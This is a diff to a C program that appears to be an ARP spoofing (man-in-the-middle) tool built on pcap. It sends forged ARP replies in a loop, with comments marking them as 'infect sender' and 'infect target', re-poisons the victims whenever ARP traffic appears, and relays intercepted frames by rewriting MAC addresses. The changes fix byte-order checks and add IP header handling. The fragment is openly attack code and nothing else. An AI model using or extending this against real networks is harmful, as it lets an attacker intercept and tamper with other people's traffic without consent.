@@ -75,6 +75,7 @@ int usage(){
         {
             continue;
         }
+
         // Sip == sender_ip?  memcmp(arp_check->Sip, sender_ip, 4)
         // oper == 0x0002   ntohs(oper~~)
 
@@ -138,6 +139,7 @@ int usage(){
     char * response_packet_pointer = (char*)malloc(sizeof(char) * 42);
     Ethernet_Header * eth_res = (Ethernet_Header *)response_packet_pointer;
     ARP_Header * arp_res = (ARP_Header *)(response_packet_pointer + 14);
+    IP_Header * IP_res = (IP_Header *)(response_packet_pointer+14);
     default_setting(eth2, arp2);
     while(1){
         pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
@@ -158,14 +160,16 @@ int usage(){
 
         printf("%4x \n",eth_res->type);
 
-        if(eth_res->type==0x0806){
+        if(ntohs(eth_res->type)==0x0806){
             printf("ARP\nInfecting again\n");
             pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
             pcap_sendpacket(handle, (u_char*)sendpacket2, 42);//infect target
             continue;
         }
-        else{
+        else if(ntohs(eth_res->type)==0x0800){
+            //check if it's IP header
             printf("Not ARP\n");
+            //check IP header's dest, source instead of arp.
             if(memcmp(eth_res->S_addr, target_MAC, 6)&& memcmp(arp_res->D_P_addr, sender_IP, 4)){
                 printf("From target\n");
                 memcpy(eth_res->D_addr, sender_MAC, 6);
